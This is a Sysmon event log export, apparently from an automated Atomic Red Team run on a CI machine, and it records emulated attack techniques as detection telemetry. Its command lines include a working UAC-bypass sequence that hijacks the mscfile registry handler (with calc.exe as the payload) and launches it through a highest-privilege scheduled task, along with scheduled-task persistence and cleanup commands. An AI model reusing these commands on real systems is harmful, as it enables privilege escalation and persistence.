"12/17/2025 7:59:52 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:52.237
ProcessGuid: {f995aebf-62f8-6942-4a05-000000000e00}
ProcessId: 6644
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:52 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:52.217
ProcessGuid: {f995aebf-62f8-6942-4905-000000000e00}
ProcessId: 8896
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:51.067
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\EventViewerBypass
Hashes: SHA256=7FC2CC9CE8B0765D63626EC8375EC437C2789A4EC2DEF8F0F8ED900691CF0E86
IsExecutable: false
Archived: true"
"12/17/2025 7:59:51 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:51.049
ProcessGuid: {f995aebf-62f7-6942-4805-000000000e00}
ProcessId: 6448
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Delete /TN ""EventViewerBypass"" /F
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62f7-6942-4505-000000000e00}
ParentProcessId: 9796
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /f & schtasks /Delete /TN ""EventViewerBypass"" /F
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:51 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:51.013
ProcessGuid: {f995aebf-62f7-6942-4505-000000000e00}
ProcessId: 9796
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /f & schtasks /Delete /TN ""EventViewerBypass"" /F
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:50.796
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\CompMgmtBypass
Hashes: SHA256=71B342E09983925C70D5FFCFD973A478B1A860067497C3FF1DDFEAFBEE5E44B7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:50 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:50.779
ProcessGuid: {f995aebf-62f6-6942-4405-000000000e00}
ProcessId: 5484
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Delete /TN ""CompMgmtBypass"" /F
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62f6-6942-4105-000000000e00}
ParentProcessId: 4312
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /f & schtasks /Delete /TN ""CompMgmtBypass"" /F
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:50 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:50.744
ProcessGuid: {f995aebf-62f6-6942-4105-000000000e00}
ProcessId: 4312
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg delete ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /f & schtasks /Delete /TN ""CompMgmtBypass"" /F
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:50 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:50.307
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\AtomicTaskModifed
Hashes: SHA256=915F8C1605D59ADFB301558A36EA26C1529687DA8A26529C146514E471DDA7F4
IsExecutable: false
Archived: true"
"12/17/2025 7:59:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:49.353
ProcessGuid: {f995aebf-62f5-6942-3d05-000000000e00}
ProcessId: 2060
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bdgdsc3m.brz.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:49 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:49.020
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\atomic red team
Hashes: SHA256=98965190ECD8AD152945F6B2719C2974FEA4A8863E04D0CFCA7EF421B31BBC72
IsExecutable: false
Archived: true"
"12/17/2025 7:59:48 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:48.121
ProcessGuid: {f995aebf-62f4-6942-3b05-000000000e00}
ProcessId: 7844
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fdg4m11x.tbf.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:47 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:47.790
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\ATOMIC-T1053.005
Hashes: SHA256=9FF07E41FAF03D0BBBF83EE350E3B64AB5539940B5738D9B7ABE0AD83005058E
IsExecutable: false
Archived: true"
"12/17/2025 7:59:47 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:47.774
ProcessGuid: {f995aebf-62f3-6942-3905-000000000e00}
ProcessId: 6148
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /delete /tn ""ATOMIC-T1053.005"" /F  
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62f3-6942-3705-000000000e00}
ParentProcessId: 1124
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c schtasks /delete /tn ""ATOMIC-T1053.005"" /F >nul 2>&1 & reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:47 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:47.527
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\T1053_005_WMI
Hashes: SHA256=3E9B190BC9A26EE6170D9EC1E7B85DFB5F2EB14E4CD3B98352B87D0242E43901
IsExecutable: false
Archived: true"
"12/17/2025 7:59:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:46.595
ProcessGuid: {f995aebf-62f2-6942-3505-000000000e00}
ProcessId: 5012
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cjaoky2i.lsq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:45 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:45.441
ProcessGuid: {f995aebf-62f1-6942-3305-000000000e00}
ProcessId: 9308
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ekull4tl.zdh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:45 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:45.113
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\AtomicTask
Hashes: SHA256=F1BA2FB2A0A3F38D4474DC613559017F95474A27A23BB4DB001E94D6A6ED7487
IsExecutable: false
Archived: true"
"12/17/2025 7:59:44 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:44.237
ProcessGuid: {f995aebf-62f0-6942-3105-000000000e00}
ProcessId: 1172
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_imkqifa3.syo.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:43.913
ProcessGuid: {f995aebf-62ef-6942-3005-000000000e00}
ProcessId: 4260
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: SCHTASKS  /Delete /S localhost /U DOMAIN\user /P At0micStrong /TN ""Atomic task"" /F 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ef-6942-2e05-000000000e00}
ParentProcessId: 7428
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c SCHTASKS /Delete /S localhost /U DOMAIN\user /P At0micStrong /TN ""Atomic task"" /F >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:43.689
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\spawn
Hashes: SHA256=522DD6C4E1FDFB0F3D74521F0758CCA7C2A32ACB858551B1927B5A690CFA23A8
IsExecutable: false
Archived: true"
"12/17/2025 7:59:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:43.670
ProcessGuid: {f995aebf-62ef-6942-2d05-000000000e00}
ProcessId: 10184
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: SCHTASKS  /Delete /TN spawn /F 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ef-6942-2b05-000000000e00}
ParentProcessId: 8612
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c SCHTASKS /Delete /TN spawn /F >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:43.439
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\T1053_005_OnStartup
Hashes: SHA256=1125F22EED1F760CC3B498E2C447941E12BE57A79EA7F7BEADEC7C2D7B261B5D
IsExecutable: false
Archived: true"
"12/17/2025 7:59:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:43.422
ProcessGuid: {f995aebf-62ef-6942-2a05-000000000e00}
ProcessId: 3380
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /delete /tn ""T1053_005_OnStartup"" /f 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ef-6942-2705-000000000e00}
ParentProcessId: 3716
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c schtasks /delete /tn ""T1053_005_OnLogon"" /f >nul 2>&1 & schtasks /delete /tn ""T1053_005_OnStartup"" /f >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:43.415
ProcessGuid: {f995aebf-59db-6942-3100-000000000e00}
ProcessId: 2556
User: NT AUTHORITY\SYSTEM
Image: C:\Windows\system32\svchost.exe
TargetFilename: C:\Windows\System32\Tasks\T1053_005_OnLogon
Hashes: SHA256=B08A8E307FF34DD633986051E333DFCD4DF395717E5C476E68572D9614998BEE
IsExecutable: false
Archived: true"
"12/17/2025 7:59:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:43.399
ProcessGuid: {f995aebf-62ef-6942-2905-000000000e00}
ProcessId: 2280
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /delete /tn ""T1053_005_OnLogon"" /f  
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ef-6942-2705-000000000e00}
ParentProcessId: 3716
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c schtasks /delete /tn ""T1053_005_OnLogon"" /f >nul 2>&1 & schtasks /delete /tn ""T1053_005_OnStartup"" /f >nul 2>&1
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:43.136
ProcessGuid: {f995aebf-62ef-6942-2605-000000000e00}
ProcessId: 1348
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:43.116
ProcessGuid: {f995aebf-62ef-6942-2505-000000000e00}
ProcessId: 6376
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:39 AM","12","Registry object added or deleted:
RuleName: T1547.001,RunKey
EventType: CreateKey
UtcTime: 2025-12-17 07:59:39.916
ProcessGuid: {f995aebf-59f5-6942-d500-000000000e00}
ProcessId: 7596
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:39 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:59:39.807
ProcessGuid: {f995aebf-62ea-6942-2205-000000000e00}
ProcessId: 9128
Image: C:\Windows\System32\mmc.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA256=24FCAF2398115D6946E93739FCEB11B07D5D31C6B906B4F42A8037A5DB473D85
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:39 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:59:39.505
ProcessGuid: {f995aebf-62ea-6942-2205-000000000e00}
ProcessId: 9128
Image: C:\Windows\System32\mmc.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9310.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft? .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA256=8AA62B9BE054D79B6575BEF1DCEDCB2A707741E0245EC876AF4FA0DAB71594FF
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:38.912
ProcessGuid: {f995aebf-62ea-6942-2105-000000000e00}
ProcessId: 10104
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Run /TN ""EventViewerBypass""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ea-6942-1d05-000000000e00}
ParentProcessId: 6952
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""EventViewerBypass"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's run the schedule task ... & schtasks /Run /TN ""EventViewerBypass""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:38.878
ProcessGuid: {f995aebf-62ea-6942-2005-000000000e00}
ProcessId: 6520
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Create /TN ""EventViewerBypass"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ea-6942-1d05-000000000e00}
ParentProcessId: 6952
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""EventViewerBypass"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's run the schedule task ... & schtasks /Run /TN ""EventViewerBypass""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 07:59:38.872
ProcessGuid: {f995aebf-62ea-6942-1f05-000000000e00}
ProcessId: 6736
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\mscfile\shell\open\command\(Default)
Details: c:\windows\System32\calc.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:38.835
ProcessGuid: {f995aebf-62ea-6942-1d05-000000000e00}
ProcessId: 6952
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""EventViewerBypass"" /TR ""eventvwr.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's run the schedule task ... & schtasks /Run /TN ""EventViewerBypass""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
